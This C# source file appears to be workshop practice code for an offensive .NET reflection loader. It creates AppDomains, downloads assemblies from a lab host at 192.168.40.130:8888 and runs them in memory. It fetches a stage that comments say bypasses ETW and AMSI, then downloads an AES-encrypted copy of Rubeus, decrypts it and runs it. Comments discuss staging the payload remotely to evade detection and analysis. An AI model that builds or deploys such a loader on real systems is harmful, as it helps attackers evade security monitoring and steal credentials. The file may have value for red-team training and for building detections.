using System;
using System.Reflection;
using System.Net;
using System.Threading;
using System.Security.Cryptography;
using System.Text;

/*
 * Workshop from @jfmaes - https://jfmaes-1.gitbook.io/reflection-workshop/
 * 
 * Interesting note about built-in bypass vs. remote bypass (45:00 ~ )
 * 
 * Regardless of dropping the loader on-disk or not, there always is a chance that the loader gets caught.
 * If the initial loader gets caught, terminated, gets quarantined etc, it will get analyzed. Yeah there is obfuscation, but it's obfuscation. 
 * So, instructor prefers remote bypass with double reflection. Something like this. 
 * 
 * first stage loader --> fetch & reflect second stage --> bypass success! --> fetch & reflect third stage (or embed third stage as a encrypted resources in the second stage, whatever you like).
 * 
 * ==============================
 * 
 * Application Domains (1:11:40 ~ )
 * 
 * AppDomain = Load and unload binaries at will. It's like having another layer of isolation/abstraction/memory inside the assembly. 
 *  - Do some thing inside the appdomain. If you are done, get rid of the appdomain. 
 *  - ex) Loader -> Run assembly -> tear down -> Run another assembly -> tear down 
 *  - what is this dark magic wtf 
 *  - Different Appdomains are still inside 1 process. Since ETW bypass is process-wide, we good. 
 * 
 * ==============================
 * TIL 
 * 
 * Seems like the workers can't return objects. Maybe it's because I'm trying to access an object returned from another appdomain? 
 * 
 * You cannot unload a single assembly. It's possible in .NET core 3.0 and later, using "contexts". 
 * https://stackoverflow.com/questions/123391/how-to-unload-an-assembly-from-the-primary-appdomain
 * Unloading might be impossible, but is it possible to find the loaded assembly's memory space and zero it out?
 * 
 * ==============================
 * 
 */

namespace RaditzTest
{
    class Program
    {
        public class Worker : MarshalByRefObject
        {
            private Assembly _assembly;
            private byte[] _assemblyBytes;

            // Grab Assembly from remote location and saves to programBytes member variable
            public void reflectFromWebEx(string url, int retryCount, int timeoutTimer, int userJitter)
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient webclient = new WebClient();
                byte[] programBytes = null;

                while (retryCount >= 0 && programBytes == null)
                {
                    try
                    {
                        programBytes = webclient.DownloadData(url);
                    }
                    catch (WebException ex)
                    {
                        retryCount--;
                        Random random = new Random();
                        int jitter = random.Next(1000, userJitter * 1000);
                        Console.WriteLine("[-] Assembly not found. Sleeping {0} seconds and retry count {1} with jitter {2}", timeoutTimer, retryCount, userJitter);
                        Thread.Sleep(timeoutTimer * 1000 + jitter);
                    }
                }

                if (programBytes == null)
                {
                    Console.WriteLine("[-] Assembly not found. Tried all recounts. Exiting.");
                    Environment.Exit(-1);
                }

                _assemblyBytes = programBytes;
                //_assembly = Assembly.Load(programBytes);
            }

            /// <summary>
            /// Load assembly using _assemblyBytes from reflectFromWebEx()
            /// </summary>
            public void loadAssembly()
            {
                _assembly = Assembly.Load(_assemblyBytes);
            }

            /// <summary>
            /// (Overload) Decrypt the byte array with deCrypt Key and load assembly _assemblyBytes from reflectFromWebEx() 
            /// </summary>
            /// <param name="assemblyBytes"></param>
            /// <param name="decryptKey"></param>
            public void loadAssembly(string decryptKey)
            {
                byte[] decryptedBytes = aes256Decrypt(_assemblyBytes, decryptKey);
                _assembly = Assembly.Load(decryptedBytes);
            }

            public void getMethods()
            {
                Console.WriteLine("\n======= List all available Methods =======");

                var assemblyTypes = _assembly.GetTypes();
                foreach (var type in assemblyTypes)
                {
                    Console.WriteLine("[Class] {0}", type.Name);
                    foreach (var methodInfo in type.GetMethods())
                    {
                        Console.WriteLine("[Method] {0}", methodInfo.Name);
                    }
                }
            }

            public void getClasses()
            {
                Console.WriteLine("\n======= List all available classes =======");

                var assemblyTypes = _assembly.GetTypes();
                foreach (var type in assemblyTypes)
                {
                    Console.WriteLine("[Class] {0}", type.Name);
                }
            }

            /// <summary>
            /// Execute the Main function of the class without parameters
            /// </summary>
            /// <param name="programBytes"></param>
            /// <param name="className"></param>
            public void execute()
            {
                _assembly.EntryPoint.Invoke(null, new object[] { null });
            }

            /// <summary>
            /// (Overload) Execute the main function of the class with a parameter 
            /// TODO: Change this to string() to make it easier 
            /// TODO: Add try/catch error handling with _assembly?
            /// </summary>
            /// <param name="parameters"></param>
            public void execute(object[] parameters)
            {
                _assembly.EntryPoint.Invoke(null, parameters);
            }

            /// <summary>
            /// (Overload) Execute specific method of a specific class, with parameters 
            /// </summary>
            /// <param name="programBytes"></param>
            /// <param name="className"></param>
            /// <param name="methodName"></param>
            /// <param name="parameters"></param>
            public void execute(string className, string methodName, object[] parameters)
            {
                Type classType = _assembly.GetType(className);
                MethodInfo classMethodInfo = classType.GetMethod(methodName);
                object obj = Activator.CreateInstance(classType);
                classMethodInfo.Invoke(obj, parameters);
            }

            // https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 
            // Technically should do environmental keying like @fuzzysec's DiscerningFinch. 
            private static byte[] aes256Decrypt(byte[] fileByteArray, string key)
            {
                
                SHA256Managed shaManaged = new SHA256Managed();
                AesManaged aesManaged = new AesManaged();
                aesManaged.Mode = CipherMode.CBC;
                aesManaged.Padding = PaddingMode.Zeros;
                aesManaged.BlockSize = 128;
                aesManaged.KeySize = 256;

                aesManaged.Key = shaManaged.ComputeHash(Encoding.UTF8.GetBytes(key));
                byte[] cipherBytes = fileByteArray;

                // Decrypting 
                var ivBytes = new byte[16];
                Array.Copy(cipherBytes, ivBytes, 16);
                aesManaged.IV = ivBytes;
                var decryptor = aesManaged.CreateDecryptor();

                byte[] decryptedBytes = decryptor.TransformFinalBlock(cipherBytes, 16, cipherBytes.Length - 16);
                aesManaged.Dispose();

                return decryptedBytes;
            }
        }


        // What about HTTPS? What about 404 error handling? 
        static void reflectFromWeb(string url)
        {
            WebClient client = new WebClient();
            byte[] programBytes = client.DownloadData(url);
            // Assembly.Load to load the bytearray in-memory 
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }

        // Reflect from on-disk... We can do better. 
        static void Reflect(string filePath)
        {
            Assembly dotnetProgram = Assembly.LoadFile(filePath);
            // Still need to give parameters because the "Main" EntryPoint of the reflected assembly 
            // expects the... "string[] args"
            // Object array = array that can hold anything. And we are just pushing string array. 
            Object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);

        }

        public static (AppDomain, Worker) createAppDomainWorker(string appDomainName)
        {
            AppDomain domain = AppDomain.CreateDomain(appDomainName);
            Console.WriteLine("[+] {0} appdomain created", appDomainName);
            Worker remoteWorker = (Worker)domain.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            return (domain,remoteWorker);
        }

        static void Main(string[] args)
        {
            // Create Namek - testo appdomain 
            (AppDomain namek, Worker namekWorker) = createAppDomainWorker("Namek");
            namekWorker.reflectFromWebEx("http://192.168.40.130:8888/SharpReflectionWorld.exe", 3, 2, 2);
            namekWorker.loadAssembly();
            namekWorker.getClasses();
            namekWorker.getMethods();
            object[] parameters = new object[] { "I am doog" };
            namekWorker.execute("SharpReflectionWorld.Dog", "bork", parameters);
            //remoteWorker.execute("SharpReflectionWorld.Program.ProgramCat", "meow", null);

            // Destory Namek 
            Console.WriteLine("[+] Unloading namek\n");
            AppDomain.Unload(namek);

            // Create SnakeWay - Actual appdomain that bypass ETW, AMSI, and execute payload (Rubeus)
            (AppDomain snakeWay, Worker snakeWayWorker) = createAppDomainWorker("Namek");
            Console.WriteLine("[+] snakeWay appdomain created");

            // Creates an instance/object of the worker? So we can just <instance>.<function> 
            snakeWayWorker = (Worker)snakeWay.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
            snakeWayWorker.reflectFromWebEx("http://192.168.40.130:8888/mscorlib.exe", 3, 2, 2);
            snakeWayWorker.loadAssembly();
            snakeWayWorker.execute();
            snakeWayWorker.reflectFromWebEx("http://192.168.40.130:8888/Rubeus_49an72dz.exe.aes", 3, 2, 2);
            Console.WriteLine("[+] Decrypting and loading aes encrypted Rubeus...");
            snakeWayWorker.loadAssembly("testo");
            object[] parameters2 = new object[] { new string[] { "triage" } };
            snakeWayWorker.execute(parameters2);

            // Destory Namek 
            Console.WriteLine("\n[+] Unloading snakeway");
            AppDomain.Unload(snakeWay);
            Console.ReadKey();
        }
    }
}
